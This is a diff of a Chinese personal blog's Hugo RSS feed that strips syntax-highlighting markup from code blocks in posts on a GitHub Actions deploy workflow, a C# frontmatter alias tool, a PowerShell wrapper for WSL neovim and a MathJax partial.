-        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; hLen; i++)
+        for (int i = 0; i &lt; hLen; i++)
         {
-            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = <span style="color:#ae81ff">0</span>; j &lt; lLen; j++)
+            for (int j = 0; j &lt; lLen; j++)
             {
                 newCell[i, j] = cells[hStart + i, lStart + j];
             }
         }
 
-        <span style="color:#66d9ef">return</span> newCell;
+        return newCell;
     }
 
-    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span>[,] NewBoard(<span style="color:#66d9ef">int</span>[,] cells)
+    public static int[,] NewBoard(int[,] cells)
     {
-        <span style="color:#66d9ef">var</span> hang = cells.GetLength(<span style="color:#ae81ff">0</span>);
-        <span style="color:#66d9ef">var</span> lie = cells.GetLength(<span style="color:#ae81ff">1</span>);
+        var hang = cells.GetLength(0);
+        var lie = cells.GetLength(1);
 
-        <span style="color:#66d9ef">var</span> newBoard = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">int</span>[hang + <span style="color:#ae81ff">2</span>, lie + <span style="color:#ae81ff">2</span>];
+        var newBoard = new int[hang + 2, lie + 2];
 
-        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; hang + <span style="color:#ae81ff">2</span>; i++)
+        for (int i = 0; i &lt; hang + 2; i++)
         {
-            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = <span style="color:#ae81ff">0</span>; j &lt; lie + <span style="color:#ae81ff">2</span>; j++)
+            for (int j = 0; j &lt; lie + 2; j++)
             {
-                newBoard[i, j] = <span style="color:#ae81ff">0</span>;
+                newBoard[i, j] = 0;
             }
         }
 
-        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">1</span>; i &lt; hang + <span style="color:#ae81ff">1</span>; i++)
+        for (int i = 1; i &lt; hang + 1; i++)
         {
-            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = <span style="color:#ae81ff">1</span>; j &lt; lie + <span style="color:#ae81ff">1</span>; j++)
+            for (int j = 1; j &lt; lie + 1; j++)
             {
-                newBoard[i, j] = cells[i - <span style="color:#ae81ff">1</span>, j - <span style="color:#ae81ff">1</span>];
+                newBoard[i, j] = cells[i - 1, j - 1];
             }
         }
 
-        <span style="color:#66d9ef">return</span> newBoard;
+        return newBoard;
     }
 }
-</code></pre></div>]]></content></item><item><title>Hugo 自动化 CI V2</title><link>https://blog.batkiz.com/posts/2020/hugo-ci-v2/</link><pubDate>Mon, 13 Apr 2020 11:19:09 +0800</pubDate><guid>https://blog.batkiz.com/posts/2020/hugo-ci-v2/</guid><description>改进了一下自动化发布博客的 CI，代码在下面。 如果想拿去用的话只需要修改 env 下的值就行了。 name: blog on: [push] # 各种信息在此处设置 env: # config.toml 里 theme 的值 THEME_NAME: left # 主题的</description><content type="html"><![CDATA[<p>改进了一下自动化发布博客的 CI，代码在下面。</p>
+</code></pre>
+]]></content></item><item><title>Hugo 自动化 CI V2</title><link>https://blog.batkiz.com/posts/2020/hugo-ci-v2/</link><pubDate>Mon, 13 Apr 2020 11:19:09 +0800</pubDate><guid>https://blog.batkiz.com/posts/2020/hugo-ci-v2/</guid><description>改进了一下自动化发布博客的 CI，代码在下面。 如果想拿去用的话只需要修改 env 下的值就行了。 name: blog on: [push] # 各种信息在此处设置 env: # config.toml 里 theme 的值 THEME_NAME: left # 主题的</description><content type="html"><![CDATA[<p>改进了一下自动化发布博客的 CI，代码在下面。</p>
 <p>如果想拿去用的话只需要修改 env 下的值就行了。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yml" data-lang="yml"><span style="color:#66d9ef">name</span>: blog
+<pre><code class="language-yml">name: blog
 
-<span style="color:#66d9ef">on</span>: [push]
+on: [push]
 
-<span style="color:#75715e"># 各种信息在此处设置</span>
-<span style="color:#66d9ef">env</span>:
-  <span style="color:#75715e"># config.toml 里 theme 的值</span>
-  <span style="color:#66d9ef">THEME_NAME</span>: left
-  <span style="color:#75715e"># 主题的 github 链接</span>
-  <span style="color:#66d9ef">THEME_REPO</span>: https://github.com/batkiz/left.git
-  <span style="color:#75715e"># github username</span>
-  <span style="color:#66d9ef">USER_NAME</span>: batkiz
-  <span style="color:#75715e"># github email</span>
-  <span style="color:#66d9ef">EMAIL</span>: batkiz@outlook.com
-  <span style="color:#75715e"># GitHub token</span>
-  <span style="color:#66d9ef">GH_TOKEN</span>: ${{ secrets.GH_TOKEN }}
+# 各种信息在此处设置
+env:
+  # config.toml 里 theme 的值
+  THEME_NAME: left
+  # 主题的 github 链接
+  THEME_REPO: https://github.com/batkiz/left.git
+  # github username
+  USER_NAME: batkiz
+  # github email
+  EMAIL: batkiz@outlook.com
+  # GitHub token
+  GH_TOKEN: ${{ secrets.GH_TOKEN }}
 
-<span style="color:#66d9ef">jobs</span>:
-  <span style="color:#66d9ef">build</span>:
-    <span style="color:#66d9ef">name</span>: Build
-    <span style="color:#66d9ef">runs-on</span>: ubuntu-latest
-    <span style="color:#66d9ef">steps</span>:
-      <span style="color:#75715e"># 获取 repo 内文件</span>
-      - <span style="color:#66d9ef">uses</span>: actions/checkout@v2
-      <span style="color:#75715e"># 使用预编译的 Hugo 二进制文件</span>
-      - <span style="color:#66d9ef">name</span>: Setup Hugo
-        <span style="color:#66d9ef">uses</span>: peaceiris/actions-hugo@v2<span style="color:#ae81ff">.2.2</span>
-        <span style="color:#66d9ef">with</span>:
-          <span style="color:#66d9ef">hugo-version</span>: <span style="color:#e6db74">&#34;latest&#34;</span>
-          <span style="color:#66d9ef">extended</span>: <span style="color:#66d9ef">true</span>
+jobs:
+  build:
+    name: Build
+    runs-on: ubuntu-latest
+    steps:
+      # 获取 repo 内文件
+      - uses: actions/checkout@v2
+      # 使用预编译的 Hugo 二进制文件
+      - name: Setup Hugo
+        uses: peaceiris/actions-hugo@v2.2.2
+        with:
+          hugo-version: &quot;latest&quot;
+          extended: true
 
-      <span style="color:#75715e"># 新建站点</span>
-      - <span style="color:#66d9ef">name</span>: new site
-        <span style="color:#66d9ef">run</span>: <span style="color:#e6db74">|
-</span><span style="color:#e6db74">          hugo new site $HOME/blog</span>
+      # 新建站点
+      - name: new site
+        run: |
+          hugo new site $HOME/blog
 
-      <span style="color:#75715e"># 获取主题</span>
-      - <span style="color:#66d9ef">name</span>: get theme
-        <span style="color:#66d9ef">run</span>: <span style="color:#e6db74">|
-</span><span style="color:#e6db74">          git clone --depth=1 $THEME_REPO $HOME/blog/themes/$THEME_NAME</span>
+      # 获取主题
+      - name: get theme
+        run: |
+          git clone --depth=1 $THEME_REPO $HOME/blog/themes/$THEME_NAME
 
-      <span style="color:#75715e"># 获取 $user.github.io 以保持 commit 记录</span>
-      - <span style="color:#66d9ef">name</span>: get username.github.io
-        <span style="color:#66d9ef">run</span>: <span style="color:#e6db74">|
-</span><span style="color:#e6db74">          git clone --no-checkout https://github.com/$USER_NAME/$USER_NAME.github.io.git $HOME/blog/public</span>
+      # 获取 $user.github.io 以保持 commit 记录
+      - name: get username.github.io
+        run: |
+          git clone --no-checkout https://github.com/$USER_NAME/$USER_NAME.github.io.git $HOME/blog/public
 
-      <span style="color:#75715e"># 将内容文件复制进入站点内</span>
-      - <span style="color:#66d9ef">name</span>: copy in
-        <span style="color:#66d9ef">run</span>: <span style="color:#e6db74">|
-</span><span style="color:#e6db74">          rm -rf $HOME/blog/config.toml $HOME/blog/content/</span>
+      # 将内容文件复制进入站点内
+      - name: copy in
+        run: |
+          rm -rf $HOME/blog/config.toml $HOME/blog/content/
           /bin/cp -rf config.toml $HOME/blog/config.toml
           /bin/cp -rf content/ $HOME/blog/content/
 
-      <span style="color:#75715e"># build</span>
-      - <span style="color:#66d9ef">name</span>: build
-        <span style="color:#66d9ef">run</span>: <span style="color:#e6db74">|
-</span><span style="color:#e6db74">          cd $HOME/blog</span>
+      # build
+      - name: build
+        run: |
+          cd $HOME/blog
           HUGO_ENV=production hugo --gc --minify
 
-      <span style="color:#75715e"># 将生成出的站点推向 user.github.io</span>
-      <span style="color:#75715e"># 由于使用了 actions/checkout@v2，所以不再需要设置 github token</span>
-      - <span style="color:#66d9ef">name</span>: publish
-        <span style="color:#66d9ef">run</span>: <span style="color:#e6db74">|
-</span><span style="color:#e6db74">          git config --global user.name $USER_NAME</span>
+      # 将生成出的站点推向 user.github.io
+      # 由于使用了 actions/checkout@v2，所以不再需要设置 github token
+      - name: publish
+        run: |
+          git config --global user.name $USER_NAME
           git config --global user.email $EMAIL
           cd $HOME/blog/public
           git add .
-          git commit -m <span style="color:#e6db74">&#34;Auto Update: `date +&#39;%Y-%m-%d %H:%M:%S&#39;`&#34;</span>
-          git push <span style="color:#e6db74">&#34;https://$USER:$GH_TOKEN@github.com/$USER_NAME/$USER_NAME.github.io.git&#34;</span> master:master
-</code></pre></div><p>附赠本人用于存放 blog 内容仓库的gitignore</p>
-<pre><code class="language-gitignore" data-lang="gitignore">/archetypes/
+          git commit -m &quot;Auto Update: `date +'%Y-%m-%d %H:%M:%S'`&quot;
+          git push &quot;https://$USER:$GH_TOKEN@github.com/$USER_NAME/$USER_NAME.github.io.git&quot; master:master
+</code></pre>
+<p>附赠本人用于存放 blog 内容仓库的gitignore</p>
+<pre><code class="language-gitignore">/archetypes/
 /data/
 /layouts/
 /public/
 /resources/
 /static/
 /themes/
-</code></pre>]]></content></item><item><title>SEO 是如何毁掉互联网的</title><link>https://blog.batkiz.com/posts/2020/how-seo-ruined-the-internet/</link><pubDate>Thu, 09 Apr 2020 22:49:16 +0800</pubDate><guid>https://blog.batkiz.com/posts/2020/how-seo-ruined-the-internet/</guid><description>原文： How SEO Ruined the Internet 翻译：batkiz 译者按：SEO，即搜索引擎优化（search engine optimization），指通过了解搜索引擎的运作规则来调</description><content type="html"><![CDATA[<p>原文： <a href="https://www.superhighway98.com/seo">How SEO Ruined the Internet</a></p>
+</code></pre>
+]]></content></item><item><title>SEO 是如何毁掉互联网的</title><link>https://blog.batkiz.com/posts/2020/how-seo-ruined-the-internet/</link><pubDate>Thu, 09 Apr 2020 22:49:16 +0800</pubDate><guid>https://blog.batkiz.com/posts/2020/how-seo-ruined-the-internet/</guid><description>原文： How SEO Ruined the Internet 翻译：batkiz 译者按：SEO，即搜索引擎优化（search engine optimization），指通过了解搜索引擎的运作规则来调</description><content type="html"><![CDATA[<p>原文： <a href="https://www.superhighway98.com/seo">How SEO Ruined the Internet</a></p>
 <p>翻译：<a href="https://github.com/batkiz">batkiz</a></p>
 <p>译者按：SEO，即搜索引擎优化（search engine optimization），指通过了解搜索引擎的运作规则来调整网站，以提高网站在有关搜索引擎内排名的方式。</p>
 <hr>
@@ -619,64 +631,66 @@ Set-Alias -Name l -Value Get-ChildItem
 <p>通过观察，所添加的 Aliases 项应被添加在 frontmatter 中，其主要依赖了文章的日期即 date 项。我最开始的想法是，将每篇文章的 frontmatter （在我的文章中用的是 yaml）序列化，对序列化后的项进行修改，最后再反序列化，保存至文章。</p>
 <p>但是由于我并没有找到一个可用性较高的解析 markdown 文件 yaml frontmatter 的库，此想法只好作罢。</p>
 <p>经过我的进一步观察，每篇文章的 date 项均处在第三行，且格式为</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="color:#66d9ef">date</span>: yyyy-mm-dd time
-</code></pre></div><p>事情就好办了起来。</p>
+<pre><code class="language-yaml">date: yyyy-mm-dd time
+</code></pre>
+<p>事情就好办了起来。</p>
 <p>核心思想即：读入文本，将位于第三行的日期解析出来-&gt;生成 Aliases 项-&gt;写入文本。</p>
 <p>下面是代码（C# 8, dotnet core 3.1），由于时间匆忙，且需求简单，因此未做过多的处理。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cs" data-lang="cs"><span style="color:#66d9ef">using</span> System.Linq;
-<span style="color:#66d9ef">using</span> System.IO;
-<span style="color:#66d9ef">using</span> System;
+<pre><code class="language-cs">using System.Linq;
+using System.IO;
+using System;
 
-<span style="color:#66d9ef">namespace</span> AddAliasToBlogPosts
+namespace AddAliasToBlogPosts
 {
-    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Program</span>
+    class Program
     {
-        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main(<span style="color:#66d9ef">string</span>[] args)
+        static void Main(string[] args)
         {
-            <span style="color:#66d9ef">string</span> dir = <span style="color:#e6db74">@&#34;C:\code\blog-contents\content\posts&#34;</span>;
-            <span style="color:#66d9ef">var</span> posts = GetPosts(dir);
+            string dir = @&quot;C:\code\blog-contents\content\posts&quot;;
+            var posts = GetPosts(dir);
 
-            <span style="color:#66d9ef">foreach</span> (<span style="color:#66d9ef">var</span> item <span style="color:#66d9ef">in</span> posts)
+            foreach (var item in posts)
             {
-                AppendAlias(GetAlias(item), item, <span style="color:#ae81ff">3</span>);
-                <span style="color:#75715e">//System.Console.WriteLine(GetAlias(item));
-</span><span style="color:#75715e"></span>            }
+                AppendAlias(GetAlias(item), item, 3);
+                //System.Console.WriteLine(GetAlias(item));
+            }
         }
 
-        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">string</span>[] GetPosts(<span style="color:#66d9ef">string</span> dir) =&gt; Directory.GetFiles(dir);
+        static string[] GetPosts(string dir) =&gt; Directory.GetFiles(dir);
 
 
-        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">string</span> GetFilesName(<span style="color:#66d9ef">string</span> path)
+        static string GetFilesName(string path)
         {
-            path = path.Split(<span style="color:#e6db74">&#39;\\&#39;</span>).Last();
-            <span style="color:#66d9ef">return</span> path.Substring(<span style="color:#ae81ff">0</span>, path.Length - <span style="color:#ae81ff">3</span>);
+            path = path.Split('\\').Last();
+            return path.Substring(0, path.Length - 3);
         }
-        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">string</span> GetLine(<span style="color:#66d9ef">string</span> text, <span style="color:#66d9ef">int</span> lineNo)
+        static string GetLine(string text, int lineNo)
         {
-            <span style="color:#66d9ef">string</span>[] lines = text.Replace(<span style="color:#e6db74">&#34;\r&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>).Split(<span style="color:#e6db74">&#39;\n&#39;</span>);
-            <span style="color:#66d9ef">return</span> lines.Length &gt;= lineNo ? lines[lineNo - <span style="color:#ae81ff">1</span>] : <span style="color:#66d9ef">null</span>;
+            string[] lines = text.Replace(&quot;\r&quot;, &quot;&quot;).Split('\n');
+            return lines.Length &gt;= lineNo ? lines[lineNo - 1] : null;
         }
 
-        <span style="color:#66d9ef">static</span> Func&lt;<span style="color:#66d9ef">string</span>, <span style="color:#66d9ef">string</span>&gt; GetTime = (path) =&gt;
+        static Func&lt;string, string&gt; GetTime = (path) =&gt;
         {
-            <span style="color:#66d9ef">string</span> text = File.ReadAllText(path);
-            <span style="color:#66d9ef">string</span> time = GetLine(text, <span style="color:#ae81ff">3</span>);
-            <span style="color:#66d9ef">return</span> time.Substring(<span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">10</span>).Replace(<span style="color:#e6db74">&#39;-&#39;</span>, <span style="color:#e6db74">&#39;/&#39;</span>);
+            string text = File.ReadAllText(path);
+            string time = GetLine(text, 3);
+            return time.Substring(6, 10).Replace('-', '/');
         };
 
-        <span style="color:#66d9ef">static</span> Func&lt;<span style="color:#66d9ef">string</span>, <span style="color:#66d9ef">string</span>&gt; GetAlias = (path)
-             =&gt; <span style="color:#e6db74">$&#34;\naliases:\n    - /{GetTime(path)}/{GetFilesName(path)}/&#34;</span>;
+        static Func&lt;string, string&gt; GetAlias = (path)
+             =&gt; $&quot;\naliases:\n    - /{GetTime(path)}/{GetFilesName(path)}/&quot;;
 
-        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> AppendAlias(<span style="color:#66d9ef">string</span> newText, <span style="color:#66d9ef">string</span> fileName, <span style="color:#66d9ef">int</span> line_to_edit)
+        static void AppendAlias(string newText, string fileName, int line_to_edit)
         {
-            <span style="color:#66d9ef">string</span>[] arrLine = File.ReadAllLines(fileName);
-            arrLine[line_to_edit - <span style="color:#ae81ff">1</span>] += newText;
+            string[] arrLine = File.ReadAllLines(fileName);
+            arrLine[line_to_edit - 1] += newText;
             File.WriteAllLines(fileName, arrLine);
         }
     }
 }
 
-</code></pre></div><p>最后，感谢 MSDN 与 StackOverflow。</p>
+</code></pre>
+<p>最后，感谢 MSDN 与 StackOverflow。</p>
 ]]></content></item><item><title>在 powershell 中无缝调用 wsl 中的 neovim</title><link>https://blog.batkiz.com/posts/2019/using-wsl-nvim-in-powershell/</link><pubDate>Sat, 30 Nov 2019 16:04:34 +0800</pubDate><guid>https://blog.batkiz.com/posts/2019/using-wsl-nvim-in-powershell/</guid><description>注：标题中的 neovim 亦可换为 vim 在如今的 Windows 中，wsl 无疑能够极大提升我的开发体验。vim 则是任何人都绕不开的 TUI 编辑器。 不可否认，zsh/bash/f</description><content type="html"><![CDATA[<blockquote>
 <p>注：标题中的 neovim 亦可换为 vim</p>
 </blockquote>
@@ -691,11 +705,12 @@ Set-Alias -Name l -Value Get-ChildItem
 </ul>
 <h2 id="解决方案">解决方案</h2>
 <p>话不多说，来看代码：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#66d9ef">function</span> vim {
-   <span style="color:#66d9ef">param</span>($fileName = <span style="color:#e6db74">&#39;.&#39;</span>)
-   wsl -e nvim $filename.Replace(<span style="color:#e6db74">&#39;\&#39;</span>,<span style="color:#e6db74">&#39;/&#39;</span>).Replace(<span style="color:#e6db74">&#39;C:&#39;</span>,<span style="color:#e6db74">&#39;/mnt/c&#39;</span>)
+<pre><code class="language-powershell">function vim {
+   param($fileName = '.')
+   wsl -e nvim $filename.Replace('\','/').Replace('C:','/mnt/c')
 }
-</code></pre></div><p>将上面的代码写入 powershell 的配置文件保存（<code>notepad.exe $PROFILE</code>），之后新开一个 powershell 终端，就能无缝体验啦。</p>
+</code></pre>
+<p>将上面的代码写入 powershell 的配置文件保存（<code>notepad.exe $PROFILE</code>），之后新开一个 powershell 终端，就能无缝体验啦。</p>
 <h2 id="对代码的解释">对代码的解释</h2>
 <p>下面是解释。</p>
 <p>第一行的 <code>function vim</code> 可以视为 Linux 之中的 alias，让我们每次在 powershell 中输入 vim 时，自动转换为下面的命令。</p>
@@ -743,9 +758,10 @@ Set-Alias -Name l -Value Get-ChildItem
 </ul>
 <h2 id="开发过程">开发过程</h2>
 <p>这里记录一些写 go 语言时的小技巧</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#75715e">// TODO
-</span><span style="color:#75715e">// （其实大家都知道 TODO 列表里的事情永远都不会办的对吧
-</span></code></pre></div><p>事实上这个在闲暇之余写的小软件已经完全地满足了我自己的需求，我甚至有点就此封存、甩手不干的冲动。</p>
+<pre><code class="language-go">// TODO
+// （其实大家都知道 TODO 列表里的事情永远都不会办的对吧
+</code></pre>
+<p>事实上这个在闲暇之余写的小软件已经完全地满足了我自己的需求，我甚至有点就此封存、甩手不干的冲动。</p>
 <p>但说实话，这个小软件还有很多缺点：</p>
 <ul>
 <li>丑陋的实现</li>
@@ -791,13 +807,14 @@ Set-Alias -Name l -Value Get-ChildItem
 <h3 id="rss">RSS</h3>
 <p>之前在 hexo 之上构建时，我采用的 hexo 插件是生成出 <code>atom.xml</code> 文件的，而在新的主题下生成的则是 <code>index.xml</code>。</p>
 <p>解决方法：在 <code>config.toml</code> 中加入下列内容</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-toml" data-lang="toml">[<span style="color:#a6e22e">outputs</span>]
-  <span style="color:#a6e22e">home</span> = [<span style="color:#e6db74">&#34;Atom&#34;</span>, <span style="color:#e6db74">&#34;HTML&#34;</span>]
+<pre><code class="language-toml">[outputs]
+  home = [&quot;Atom&quot;, &quot;HTML&quot;]
 
-[<span style="color:#a6e22e">outputFormats</span>.<span style="color:#a6e22e">Atom</span>]
-  <span style="color:#a6e22e">mediatype</span> = <span style="color:#e6db74">&#34;application/rss&#34;</span>
-  <span style="color:#a6e22e">baseName</span> = <span style="color:#e6db74">&#34;atom&#34;</span>
-</code></pre></div><p>即可生成 <code>atom.xml</code> 文件作为 RSS feed。</p>
+[outputFormats.Atom]
+  mediatype = &quot;application/rss&quot;
+  baseName = &quot;atom&quot;
+</code></pre>
+<p>即可生成 <code>atom.xml</code> 文件作为 RSS feed。</p>
 <p>在成功解决上述兼容性问题之后，新问题随之而来：<strong>为什么生成的 xml 里 tmd 没有内容？</strong></p>
 <p>为解决此问题，我试着看了看源码，但看不懂（</p>
 <p>接着我试了试 Google，感谢 <a href="https://github.com/kaushalmodi/hugo-atom-feed">kaushalmodi</a> 的代码，我用它覆盖了 <code>index.atom.xml</code> 之后便成功部署了正确的 RSS，简单修改（将默认的只生成最近 6 条增加到 20）之后便符合了需求。</p>
@@ -807,43 +824,46 @@ Set-Alias -Name l -Value Get-ChildItem
 <p>接下来仍然是 Google。</p>
 <p>感谢 <a href="http://weibo.com/u/2837672545">匿蟒</a>，我在 <a href="https://note.qidong.name/2018/03/hugo-mathjax/">在 Hugo 中使用 MathJax</a> 一文中找到了解决方案，即下述方法：</p>
 <p>在添加 <a href="https://www.mathjax.org/">MathJax</a> 时，把所有修改写成了一个 <code>layouts/partials/mathjax.html</code> 文件：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">async</span>
-    <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML&#34;</span>&gt;
-        <span style="color:#a6e22e">MathJax</span>.<span style="color:#a6e22e">Hub</span>.<span style="color:#a6e22e">Config</span>({
-            <span style="color:#e6db74">&#34;HTML-CSS&#34;</span><span style="color:#f92672">:</span> {<span style="color:#a6e22e">preferredFont</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;TeX&#34;</span>, <span style="color:#a6e22e">availableFonts</span><span style="color:#f92672">:</span> [<span style="color:#e6db74">&#34;STIX&#34;</span>, <span style="color:#e6db74">&#34;TeX&#34;</span>], <span style="color:#a6e22e">linebreaks</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">automatic</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span> }, <span style="color:#a6e22e">EqnChunk</span><span style="color:#f92672">:</span> (<span style="color:#a6e22e">MathJax</span>.<span style="color:#a6e22e">Hub</span>.<span style="color:#a6e22e">Browser</span>.<span style="color:#a6e22e">isMobile</span> <span style="color:#f92672">?</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">:</span> <span style="color:#ae81ff">50</span>) },
-            <span style="color:#a6e22e">tex2jax</span><span style="color:#f92672">:</span> {<span style="color:#a6e22e">inlineMath</span><span style="color:#f92672">:</span> [[<span style="color:#e6db74">&#34;$&#34;</span>, <span style="color:#e6db74">&#34;$&#34;</span>], [<span style="color:#e6db74">&#34;\\(&#34;</span>, <span style="color:#e6db74">&#34;\\)&#34;</span>]], <span style="color:#a6e22e">processEscapes</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>, <span style="color:#a6e22e">ignoreClass</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;tex2jax_ignore|dno&#34;</span>, <span style="color:#a6e22e">skipTags</span><span style="color:#f92672">:</span> [<span style="color:#e6db74">&#39;script&#39;</span>, <span style="color:#e6db74">&#39;noscript&#39;</span>, <span style="color:#e6db74">&#39;style&#39;</span>, <span style="color:#e6db74">&#39;textarea&#39;</span>, <span style="color:#e6db74">&#39;pre&#39;</span>, <span style="color:#e6db74">&#39;code&#39;</span>] },
-            <span style="color:#a6e22e">TeX</span><span style="color:#f92672">:</span> {<span style="color:#a6e22e">noUndefined</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">attributes</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">mathcolor</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;red&#34;</span>, <span style="color:#a6e22e">mathbackground</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;#FFEEEE&#34;</span>, <span style="color:#a6e22e">mathsize</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;90%&#34;</span>} }, <span style="color:#a6e22e">Macros</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">href</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;{}&#34;</span> } },
-            <span style="color:#a6e22e">messageStyle</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;none&#34;</span>
+<pre><code class="language-html">&lt;script type=&quot;text/javascript&quot; async
+    src=&quot;https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML&quot;&gt;
+        MathJax.Hub.Config({
+            &quot;HTML-CSS&quot;: {preferredFont: &quot;TeX&quot;, availableFonts: [&quot;STIX&quot;, &quot;TeX&quot;], linebreaks: { automatic: true }, EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50) },
+            tex2jax: {inlineMath: [[&quot;$&quot;, &quot;$&quot;], [&quot;\\(&quot;, &quot;\\)&quot;]], processEscapes: true, ignoreClass: &quot;tex2jax_ignore|dno&quot;, skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'] },
+            TeX: {noUndefined: { attributes: { mathcolor: &quot;red&quot;, mathbackground: &quot;#FFEEEE&quot;, mathsize: &quot;90%&quot;} }, Macros: { href: &quot;{}&quot; } },
+            messageStyle: &quot;none&quot;
         });
 
-        <span style="color:#a6e22e">MathJax</span>.<span style="color:#a6e22e">Hub</span>.<span style="color:#a6e22e">Queue</span>(<span style="color:#66d9ef">function</span> () {
-            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">all</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">MathJax</span>.<span style="color:#a6e22e">Hub</span>.<span style="color:#a6e22e">getAllJax</span>(), <span style="color:#a6e22e">i</span>;
-            <span style="color:#66d9ef">for</span> (<span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">all</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>) {
-                <span style="color:#a6e22e">all</span>[<span style="color:#a6e22e">i</span>].<span style="color:#a6e22e">SourceElement</span>().<span style="color:#a6e22e">parentNode</span>.<span style="color:#a6e22e">className</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;has-jax&#39;</span>;
+        MathJax.Hub.Queue(function () {
+            var all = MathJax.Hub.getAllJax(), i;
+            for (i = 0; i &lt; all.length; i += 1) {
+                all[i].SourceElement().parentNode.className += 'has-jax';
             }
         });
-    &lt;/<span style="color:#f92672">script</span>&gt;
+    &lt;/script&gt;
 
-&lt;<span style="color:#f92672">style</span>&gt;
-    <span style="color:#f92672">code</span>.<span style="color:#a6e22e">has-jax</span> {
-        <span style="color:#66d9ef">font</span>: <span style="color:#66d9ef">inherit</span>;
-        <span style="color:#66d9ef">font-size</span>: <span style="color:#ae81ff">100</span><span style="color:#66d9ef">%</span>;
-        <span style="color:#66d9ef">background</span>: <span style="color:#66d9ef">inherit</span>;
-        <span style="color:#66d9ef">border</span>: <span style="color:#66d9ef">inherit</span>;
-        <span style="color:#66d9ef">color</span>: <span style="color:#ae81ff">#515151</span>;
+&lt;style&gt;
+    code.has-jax {
+        font: inherit;
+        font-size: 100%;
+        background: inherit;
+        border: inherit;
+        color: #515151;
     }
-&lt;/<span style="color:#f92672">style</span>&gt;
-</code></pre></div><p>这里，把官网的三处修改合并成一个 partial。 此外，还把 <a href="https://www.mathjax.org/">MathJax</a> 的 CDN 从 <code>cdnjs.cloudflare.com</code> 替换成了 <code>cdn.bootcss.com</code>，更好地支持国内。</p>
+&lt;/style&gt;
+</code></pre>
+<p>这里，把官网的三处修改合并成一个 partial。 此外，还把 <a href="https://www.mathjax.org/">MathJax</a> 的 CDN 从 <code>cdnjs.cloudflare.com</code> 替换成了 <code>cdn.bootcss.com</code>，更好地支持国内。</p>
 <p>把这个 partial 模板添加到 <code>&lt;head&gt;</code> 中，即可正常工作。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">{{partial &#34;mathjax.html&#34; .}}
-</code></pre></div><h3 id="frontmatter">frontmatter</h3>
+<pre><code class="language-html">{{partial &quot;mathjax.html&quot; .}}
+</code></pre>
+<h3 id="frontmatter">frontmatter</h3>
 <p>Hugo 支持 toml, yml 与 json 格式的 frontmatter，但与 Hexo 的 yml frontmatter 又有所不同。</p>
 <p>Hugo 中的 tags 的形式应为</p>
